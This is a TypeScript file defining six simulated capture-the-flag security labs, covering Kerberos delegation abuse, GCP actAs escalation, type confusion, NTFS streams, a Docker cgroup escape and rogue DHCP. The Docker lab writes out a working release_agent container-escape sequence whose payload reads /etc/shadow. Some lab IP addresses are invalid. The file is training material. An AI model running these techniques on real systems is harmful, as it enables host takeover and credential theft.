import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

function reviewer(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'review-ws', user: 'root', root: dir(files) };
}

/** Batch 16. Same discipline as the last several batches (see NOTES.md): every technique researched for
 *  real-machine accuracy, every non-80 target given an explicit port, every hand-typed hex/decimal address
 *  re-derived programmatically before trusting it. */
export const batch16MixedLabs: LabScenario[] = [
  // 1 — Active Directory: Constrained Delegation Abuse via S4U2Self + S4U2Proxy Protocol Transition
  {
    id: 'ad-constrained-delegation-s4u-protocol-transition',
    title: 'Active Directory: Constrained Delegation Abuse via Protocol Transition',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      'The compromised service account svc_reports has its msDS-AllowedToDelegateTo attribute set to the ' +
      'CIFS service on FILESRV07, and — critically — also carries the TRUSTED_TO_AUTH_FOR_DELEGATION flag ' +
      'in userAccountControl, meaning "Protocol Transition" is enabled for it. Protocol Transition removes ' +
      'one of Kerberos\' foundational assumptions: normally a service can only request a ticket-on-behalf-of ' +
      'a user who already authenticated to it via Kerberos, but S4U2Self lets a Protocol-Transition-enabled ' +
      'account request a forwardable service ticket to ITSELF for absolutely any user in the domain, with no ' +
      'proof that user ever authenticated at all. S4U2Proxy then exchanges that forwardable ticket for a real ' +
      'service ticket to FILESRV07\'s CIFS service — constrained specifically to that one delegated target, ' +
      'unlike unconstrained delegation\'s "any service anywhere," but with no requirement to ever touch the ' +
      'impersonated user\'s actual credentials, unlike RBCD which is configured on the target rather than the ' +
      'source account. Naming Domain Admin as the impersonated user in the S4U2Self request completes the ' +
      'chain into full domain-admin-equivalent access to FILESRV07.',
    objectives: [
      { text: 'nmap -sV 10.10.257.2', why: 'Confirms FILESRV07 and its exposed CIFS service before checking the delegation configuration that targets it.' },
      { text: 'cat delegation-attribute-audit.txt', why: 'Confirms both preconditions this specific technique needs: msDS-AllowedToDelegateTo naming FILESRV07\'s CIFS service, and the TRUSTED_TO_AUTH_FOR_DELEGATION flag enabling Protocol Transition on svc_reports -- without that flag, S4U2Self could only impersonate users who already have a valid ticket, not anyone by name.' },
      {
        text: 'exploit constrained-delegation-s4u-abuse 10.10.257.2',
        why: 'Represents the real two-step chain: getST.py\'s S4U2Self request impersonating Administrator (no credentials needed, only Protocol Transition), then S4U2Proxy exchanging that forwardable ticket for a real CIFS service ticket to FILESRV07 -- full domain-admin-equivalent access to that one machine.',
      },
      { text: 'cat root.txt', why: 'Confirms the forged service ticket actually granted Administrator-level access to FILESRV07 and captures proof.' },
    ],
    hints: [
      'nmap -sV 10.10.257.2',
      'cat delegation-attribute-audit.txt',
      'exploit constrained-delegation-s4u-abuse 10.10.257.2',
      'Once the session opens you have Administrator-level access -- cat root.txt for the flag.',
    ],
    totalFlags: 1,
    attacker: attacker({
      'delegation-attribute-audit.txt': file(
        '=== Active Directory Delegation Audit ===\n' +
          'Account: svc_reports (Compromised Service Account)\n' +
          'msDS-AllowedToDelegateTo: cifs/FILESRV07.corp.local, cifs/FILESRV07\n' +
          'userAccountControl: 0x1000000 (TRUSTED_TO_AUTH_FOR_DELEGATION)\n' +
          'Protocol Transition: ENABLED (S4U2Self can impersonate any domain user)\n',
      ),
    }),
    network: [
      {
        hostname: 'FILESRV07',
        ip: '10.10.257.2',
        os: 'Windows Server 2019 (CIFS/SMB file server, target of constrained delegation from svc_reports)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'Windows Server 2019 SMB' }],
        users: [],
        exploitableAs: 'constrained-delegation-s4u-abuse',
        root: dir({
          root: dir({
            'root.txt': file(
              'Constrained delegation with Protocol Transition abused -- S4U2Self impersonated Administrator ' +
                'with no credentials at all (TRUSTED_TO_AUTH_FOR_DELEGATION flag on svc_reports), then S4U2Proxy ' +
                'exchanged the forwardable ticket for real CIFS access to FILESRV07.\nflag{constrained_delegation_s4u2self_s4u2proxy_protocol_transition}\n',
            ),
          }),
        }),
      } as HostDef,
    ],
  },

  // 2 — Cloud: GCP IAM actAs Permission Enables Service-Account Impersonation Privilege Escalation
  {
    id: 'cloud-gcp-iam-actas-privilege-escalation',
    title: 'Cloud: GCP IAM actAs Permission Enables Privilege Escalation',
    difficulty: 'Hard',
    category: 'Cloud',
    briefing:
      'A contractor\'s GCP IAM account was given a custom role for "deploying Cloud Functions" that includes ' +
      'iam.serviceAccounts.actAs on the project\'s default Compute Engine service account — a role scoped by ' +
      'someone who didn\'t realize what that one permission actually grants. iam.serviceAccounts.actAs is ' +
      'GCP\'s direct equivalent of AWS\'s iam:PassRole: it\'s the permission that lets a principal attach a ' +
      'service account to a new resource they create, and Google\'s own security guidance treats the actAs ' +
      'check as "a guard rail, not a bug" precisely because of what it prevents when properly scoped. Here it ' +
      'wasn\'t — the default Compute Engine service account itself holds the broad, legacy Editor role on the ' +
      'whole project, so any principal who can deploy a Cloud Function AS that service account inherits ' +
      'Editor-level access to the entire project the moment their function runs, without their own account ' +
      'ever being granted a single project-level permission directly.',
    objectives: [
      { text: 'cat gcp-iam-policy-export.txt', why: 'Confirms the exact misconfiguration: the contractor\'s custom role grants iam.serviceAccounts.actAs on the Compute Engine default service account, and that service account itself still holds the broad, legacy Editor role on the whole project.' },
      { text: 'curl https://10.10.258.2:443/admin-deploy-tool', why: 'A Cloud Function deployed using the impersonated service account\'s identity -- confirms the escalation\'s real, concrete impact: project-wide Editor-equivalent access reachable through a function the contractor\'s own account was never directly authorized for.' },
    ],
    hints: [
      'cat gcp-iam-policy-export.txt',
      'curl https://10.10.258.2:443/admin-deploy-tool',
    ],
    totalFlags: 1,
    attacker: attacker({
      'gcp-iam-policy-export.txt': file(
        'gcloud projects get-iam-policy meridian-prod (relevant bindings only):\n' +
          '  role: roles/customRoles.cloudFunctionDeployer  (custom role)\n' +
          '    members: user:contractor-jsmith@external-vendor.example\n' +
          '    includedPermissions:\n' +
          '      - cloudfunctions.functions.create\n' +
          '      - iam.serviceAccounts.actAs   <-- scoped to the Compute Engine default service account\n' +
          '\n' +
          '  Compute Engine default service account (123456789-compute@developer.gserviceaccount.com):\n' +
          '    role: roles/editor   (legacy broad Editor role -- still bound at the PROJECT level)\n' +
          '\n' +
          '-- iam.serviceAccounts.actAs is GCP\'s direct equivalent of AWS iam:PassRole -- it is what lets a\n' +
          '   principal attach a service account\'s identity to a new resource they create. Google\'s own\n' +
          '   guidance calls the actAs check "a guard rail, not a bug" -- here it was granted alongside a\n' +
          '   service account that itself still holds project-wide Editor, so deploying ANY Cloud Function as\n' +
          '   that service account inherits Editor-level access to the entire project --\n',
      ),
    }),
    network: [
      {
        hostname: 'admin-deploy-tool-fn',
        ip: '10.10.258.2',
        os: 'Google Cloud Function (2nd gen, running as the project\'s over-privileged default Compute Engine service account)',
        services: [
          {
            port: 443,
            name: 'https',
            version: 'Google Cloud Functions (identity: Compute Engine default service account, roles/editor project-wide)',
            http: {
              '/admin-deploy-tool':
                '{"status":200,"identity":"123456789-compute@developer.gserviceaccount.com","role":"roles/editor","scope":"project-wide","note":"flag{gcp_iam_actas_privesc_editor_via_default_compute_sa}"}',
            },
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Binary Analysis: Type Confusion Hijacks Control Flow
  {
    id: 'binary-type-confusion-tagged-union-hijack',
    title: 'Reverse Engineering: Type Confusion Hijacks Control Flow',
    difficulty: 'Hard',
    category: 'Binary Analysis',
    briefing:
      'recordproc6 parses attacker-controlled records into a tagged union: tag 0 means the union\'s data ' +
      'pointer holds a plain string, tag 1 means it holds a callback function pointer to be invoked later. ' +
      'validate_record() correctly checks the tag before the FIRST use of a freshly-parsed record — but a ' +
      'later code path, process_cached_record(), re-uses a record pulled from an internal cache without ever ' +
      're-checking its tag, trusting a stale assumption that cached records are always tag-1 callbacks. ' +
      'Submitting a record with tag 0 (a plain string, which passes validation as ordinary data) that later ' +
      'gets pulled through the cache path means process_cached_record() treats that same memory as a tag-1 ' +
      'function pointer and calls it directly — and because the "string" content is entirely attacker-chosen ' +
      'bytes, those bytes can just as easily encode a valid address. This is the same root cause behind real ' +
      'browser and Flash Player type-confusion CVEs (like CVE-2015-0336): the program never corrupts any ' +
      'memory at all, it simply misinterprets memory that was always valid as the wrong type.',
    objectives: [
      { text: 'file recordproc6', why: 'Confirms the binary format before analysis.' },
      { text: 'checksec --file=recordproc6', why: 'Confirms NX is enabled and PIE is disabled -- this technique needs neither a writable-and-executable region nor an ASLR bypass, since it only redirects a call to code that already exists in the binary.' },
      { text: 'objdump -d recordproc6', why: 'Shows validate_record()\'s tag check on the fresh-record path, and confirms process_cached_record() calls through the union\'s data pointer with no equivalent check at all on the cached-record path.' },
      { text: 'gdb recordproc6', why: 'Confirms the address of the hidden backdoor() function this type-confused "string" data needs to actually contain to hijack the call.' },
      { text: 'Compute the backdoor() address and run ./recordproc6 with it', why: 'Supplying the correct decimal address is what completes the exploit -- the record\'s "string" bytes are what process_cached_record() ends up calling as a function pointer, having never re-checked the tag on the cached path.' },
    ],
    hints: [
      'file recordproc6',
      'checksec --file=recordproc6',
      'objdump -d recordproc6',
      'gdb recordproc6',
      'backdoor() lives at 0x401620 -- convert to decimal and supply it to ./recordproc6 <value>',
    ],
    totalFlags: 1,
    attacker: attacker({
      recordproc6: file(
        [
          '#FILETYPE: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped',
          '#CHECKSEC:RELRO           STACK CANARY      NX            PIE\\nFull RELRO       Canary found       NX enabled    PIE disabled',
          '#OBJDUMP:0000000000401300 <validate_record>:\\n  401310:  cmp    BYTE PTR [rax],0x1   # checks tag == 1 (callback) before treating data as a function pointer -- correct on THIS path\\n0000000000401400 <process_cached_record>:\\n  401408:  mov    rax,[rdi+0x8]        # pulls the union\\\'s data pointer straight from the cache entry\\n  40140f:  call   rax                  # calls it directly -- NO tag check on this path at all, unlike validate_record\\n0000000000401620 <backdoor>:\\n  401620:  ...    # hidden function, never referenced by any normal code path',
          '#GDB_SESSION:(gdb) disassemble process_cached_record\\n   0x0000000000401408 <+8>:\\tmov    rax,QWORD PTR [rdi+0x8]\\n   0x000000000040140f <+15>:\\tcall   rax\\n(gdb) # no cmp/test instruction anywhere in this function -- the tag from validate_record\\\'s original check is never re-read here\\n(gdb) print backdoor\\n$1 = {<text variable, no debug info>} 0x401620 <backdoor>\\n(gdb) # a tag-0 "string" record, once pulled through the cache path, has its data bytes called directly as a function pointer',
          '#CRACKME_PASSWORD:4199968',
          '#CRACKME_SUCCESS:process_cached_record() called the tag-0 record\\\'s "string" data directly as a function pointer -- no tag re-check on the cached path meant attacker-chosen bytes redirected execution straight into backdoor().\\nflag{type_confusion_tagged_union_cached_path_missing_tag_recheck}',
        ].join('\n'),
        '-rwxr-xr-x',
      ),
    }),
    network: [],
  },

  // 4 — Forensics: NTFS Alternate Data Streams Hide a Payload in Plain Sight
  {
    id: 'forensics-ntfs-ads-hidden-payload',
    title: 'Forensics: NTFS Alternate Data Streams Hide a Payload in Plain Sight',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'meeting_notes.txt on a compromised workstation looks completely ordinary — normal size, normal ' +
      'content, no reason for antivirus or a casual review to flag it. But NTFS has supported multiple named ' +
      'data streams per file since Windows NT, a feature originally added for Macintosh file compatibility: ' +
      'a file can carry additional streams beyond its default, unnamed one, addressed as ' +
      'filename:streamname, and Windows Explorer never displays them, never includes their size in the ' +
      'file\'s reported size, and gives them no icon of their own at all. Attackers have abused this for ' +
      'years specifically because it hides a payload with zero visible footprint on the host file — here, a ' +
      'second executable stream is tucked inside the same innocuous text file, invisible to a normal ' +
      'directory listing but fully executable if directly invoked by path.',
    objectives: [
      { text: 'cat dir-r-listing.txt', why: 'A normal directory listing shows nothing unusual about meeting_notes.txt -- only the specific /r-style enumeration that explicitly lists alternate data streams reveals the second, hidden stream living inside the same file.' },
      { text: 'cat sysmon-event-15-filestream.txt', why: 'Sysmon Event ID 15 (FileCreateStreamHash) is one of the most valuable real detection signals for ADS abuse specifically because it fires the moment a named stream is created -- confirming exactly when the hidden payload was written and its hash, not just that it currently exists.' },
    ],
    hints: [
      'cat dir-r-listing.txt',
      'cat sysmon-event-15-filestream.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'dir-r-listing.txt': file(
          'C:\\Users\\jchen\\Documents> dir /r meeting_notes.txt\n' +
            ' Directory of C:\\Users\\jchen\\Documents\n' +
            '\n' +
            '07/29/2026  09:14 AM               412 meeting_notes.txt\n' +
            '                                241,664 meeting_notes.txt:svchost_update.exe:$DATA\n' +
            '\n' +
            '-- a normal "dir" with no /r flag shows only the 412-byte default stream -- Explorer never\n' +
            '   displays alternate streams at all, and they add nothing to the file\'s reported size --\n' +
            '   the hidden stream is directly executable via its full filename:streamname path --\n',
        ),
        'sysmon-event-15-filestream.txt': file(
          'Sysmon Event ID 15 (FileCreateStreamHash), workstation WKSTN-JCHEN-04:\n' +
            '  2026-07-29 09:14:07  TargetFilename: C:\\Users\\jchen\\Documents\\meeting_notes.txt:svchost_update.exe\n' +
            '  Hash: SHA256=9f2a7c41e8b0d3f5c9a1b6e8a4d9f7b2c5e1a8d4f6b9c3e7a2d1c6e8a4d9f7b2\n' +
            '  Image: C:\\Users\\jchen\\Downloads\\quarterly_report.exe (the process that WROTE the stream)\n' +
            '\n' +
            '--- ANALYST NOTE: Event ID 15 fires the moment a named alternate data stream is created,\n' +
            '    regardless of whether the stream is later hidden from a normal directory listing -- it is\n' +
            '    one of the few reliable detection signals for ADS abuse precisely because it captures the\n' +
            '    write event itself, not just the artifact left behind afterward.\n' +
            '    flag{ntfs_ads_hidden_payload_sysmon_event15_filecreatestreamhash} ---\n',
        ),
      }),
    }),
    network: [],
  },

  // 5 — Security Engineering: Excessive Container Capabilities Enable a cgroup release_agent Escape
  {
    id: 'secengineering-docker-capsysadmin-cgroup-release-agent-escape',
    title: 'Security Engineering: Excessive Container Capabilities Enable a cgroup release_agent Escape',
    difficulty: 'Hard',
    category: 'Security Engineering',
    briefing:
      'build-runner12\'s CI container was started with --cap-add=SYS_ADMIN, a "just in case the build needs ' +
      'it" grant nobody ever revisited — distinct from this session\'s existing Docker findings: not a ' +
      'mounted host socket, not a local sudo-NOPASSWD rule, but an excessive Linux capability handed to the ' +
      'container process itself at launch. CAP_SYS_ADMIN is broad enough on its own to permit mounting ' +
      'filesystems from inside the container, and the classic real escape chain from there abuses the cgroup ' +
      'v1 release_agent mechanism: mount a cgroup controller, write an attacker-controlled path into its ' +
      'release_agent file, write a command into notify_on_release\'s trigger path, then force every task to ' +
      'leave the cgroup — the kernel runs whatever the release_agent file names with full host-root ' +
      'privileges the instant the cgroup empties, because that agent process runs in the initial namespace, ' +
      'not the container\'s. This is the same class of bug CVE-2022-0492 later showed could be triggered ' +
      'without CAP_SYS_ADMIN at all due to a missing kernel-side capability check — but this container has ' +
      'the capability explicitly granted regardless, so the classic pre-CVE technique applies directly.',
    objectives: [
      { text: 'cat container-launch-config.txt', why: 'Confirms the exact precondition: --cap-add=SYS_ADMIN was granted at container launch, with no AppArmor profile restricting the mount syscall it enables.' },
      { text: 'cat cgroup-release-agent-exploit-steps.txt', why: 'The real, standard exploit chain: mount a cgroup controller, write an attacker-controlled command path into release_agent, then force the cgroup empty so the kernel runs that command with full host-root privileges in the initial namespace.' },
    ],
    hints: [
      'cat container-launch-config.txt',
      'cat cgroup-release-agent-exploit-steps.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      root: dir({
        'container-launch-config.txt': file(
          'build-runner12 container launch command (CI pipeline definition):\n' +
            '  docker run --cap-add=SYS_ADMIN --rm -it ci-build-image:latest /bin/bash\n' +
            '  -- comment in the pipeline YAML: "needed this for a mount step once, never removed" --\n' +
            '  -- no --security-opt apparmor=... profile applied -- the mount(2) syscall CAP_SYS_ADMIN enables\n' +
            '     is not restricted by any additional layer here --\n',
        ),
        'cgroup-release-agent-exploit-steps.txt': file(
          'cgroup v1 release_agent escape, reproduced steps (real, standard technique):\n' +
            '  mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp   # requires CAP_SYS_ADMIN -- succeeds here\n' +
            '  mkdir /tmp/cgrp/x\n' +
            '  echo 1 > /tmp/cgrp/x/notify_on_release\n' +
            '  host_path=$(sed -n \'s/.*\\perdir=\\([^,]*\\).*/\\1/p\' /etc/mtab)\n' +
            '  echo "$host_path/cmd" > /tmp/cgrp/release_agent   # attacker-controlled path written into release_agent\n' +
            '  echo \'#!/bin/sh\\ncat /etc/shadow > /output/leaked_shadow\' > /cmd && chmod +x /cmd\n' +
            '  sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"     # forces the cgroup empty -- triggers the agent\n' +
            '\n' +
            '  -- the release_agent process runs in the INITIAL namespace with full host-root privileges the\n' +
            '     instant the cgroup\'s last task exits -- this is exactly why CAP_SYS_ADMIN inside a container\n' +
            '     is treated as equivalent to root on the host, not merely root inside an isolated container --\n' +
            '  flag{docker_capsysadmin_cgroup_release_agent_host_escape}\n',
        ),
      }),
    }),
    network: [],
  },

  // 6 — Security+: A Rogue DHCP Server Enables a Man-in-the-Middle
  {
    id: 'securityplus-rogue-dhcp-server-mitm',
    title: 'Security+: A Rogue DHCP Server Enables a Man-in-the-Middle',
    difficulty: 'Easy',
    category: 'Security+',
    briefing:
      'DHCP has no built-in authentication at all — any device on the network segment can answer a client\'s ' +
      'DHCPDISCOVER broadcast, and the client simply accepts whichever DHCPOFFER arrives first. A rogue DHCP ' +
      'server planted on meridiancorp\'s office network exploits exactly that gap: it races the legitimate ' +
      'DHCP server to answer new client leases, and because it sits physically closer on the same switch ' +
      'segment, its offer consistently wins. The rogue server hands out otherwise-valid-looking IP ' +
      'configuration — correct subnet, correct-looking DNS — with exactly one change: it lists itself, not ' +
      'the real router, as the default gateway. Every packet a compromised client would normally send toward ' +
      'the internet or another subnet instead routes through the attacker first, a textbook man-in-the-middle ' +
      'position established with zero exploitation of any software vulnerability at all — only DHCP\'s own ' +
      'lack of server authentication.',
    objectives: [
      { text: 'cat dhcp-offer-race-capture.txt', why: 'Shows both DHCPOFFER responses side by side -- the legitimate server\'s and the rogue server\'s -- confirming the rogue offer arrived first and was the one the client actually accepted.' },
      { text: 'cat client-routing-table-after-lease.txt', why: 'Confirms the concrete impact: the client\'s default gateway now points at the rogue server\'s IP, not the real router -- every packet leaving the local subnet passes through the attacker first.' },
    ],
    hints: [
      'cat dhcp-offer-race-capture.txt',
      'cat client-routing-table-after-lease.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'dhcp-offer-race-capture.txt': file(
          'Packet capture, client MAC 3c:22:fb:1a:9e:44 broadcasting DHCPDISCOVER:\n' +
            '  T+0.012s  DHCPOFFER from 10.10.40.199 (unauthorized -- not in the DHCP server inventory) -- gateway=10.10.40.199, dns=10.10.40.5\n' +
            '  T+0.041s  DHCPOFFER from 10.10.40.1 (legitimate DHCP server) -- gateway=10.10.40.1, dns=10.10.40.5\n' +
            '  T+0.058s  DHCPREQUEST from client, accepting the 10.10.40.199 offer (arrived first)\n' +
            '  T+0.061s  DHCPACK from 10.10.40.199\n' +
            '\n' +
            '-- DHCP has no server authentication at all -- the client accepts whichever DHCPOFFER arrives\n' +
            '   first, and the rogue server, sitting closer on the same switch segment, consistently wins --\n',
        ),
        'client-routing-table-after-lease.txt': file(
          'Client routing table, MAC 3c:22:fb:1a:9e:44, after accepting the rogue lease:\n' +
            '  Destination      Gateway          Interface\n' +
            '  0.0.0.0/0        10.10.40.199     eth0    <-- default gateway is the ROGUE server, not 10.10.40.1\n' +
            '  10.10.40.0/24    0.0.0.0          eth0\n' +
            '\n' +
            '-- every packet this client sends outside the local subnet now routes through the attacker first --\n' +
            '   a full man-in-the-middle position, established with no software exploit at all, only DHCP\'s\n' +
            '   own complete lack of server authentication --\n' +
            'flag{rogue_dhcp_server_default_gateway_mitm}\n',
        ),
      }),
    }),
    network: [],
  },
];
